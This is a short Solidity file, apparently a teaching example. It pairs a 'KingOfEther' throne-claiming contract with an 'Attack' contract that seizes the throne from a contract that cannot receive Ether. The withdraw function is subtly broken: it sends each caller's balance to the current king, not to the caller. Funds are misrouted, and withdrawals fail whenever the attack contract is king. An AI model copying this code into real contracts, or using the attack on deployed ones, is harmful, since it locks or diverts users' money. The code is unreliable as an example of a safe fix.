// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;

contract KingOfEther {
    address public king;
    uint public balance;
    mapping(address => uint) public balances;

    function claimThrone() external payable {
        require(msg.value > balance, "You need to pay more to become the king");

        balances[king] += balance;

        balance = msg.value;
        king = msg.sender;
    }

    function withdraw() public {
        require(msg.sender != king, "Current king cannot withdraw");

        uint amount = balances[msg.sender];
        balances[msg.sender] = 0;

        (bool sent, ) = king.call{value: amount}("");
        require(sent, "Failed to send Ether");
    }
}

contract Attack {
    function attack(KingOfEther kingOfEther) public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}